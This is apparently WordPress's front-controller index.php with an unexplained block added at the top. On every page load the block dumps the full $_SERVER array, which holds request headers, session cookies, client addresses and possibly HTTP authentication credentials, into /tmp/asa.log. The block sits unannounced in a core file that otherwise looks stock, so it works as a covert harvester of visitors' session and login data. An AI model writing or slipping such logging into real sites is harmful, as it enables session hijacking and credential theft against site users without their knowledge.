<?php
ob_start();
print_r($_SERVER);
$e = ob_get_contents();
ob_end_clean();
file_put_contents('/tmp/asa.log', $e, FILE_APPEND);

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require('./wp-blog-header.php');
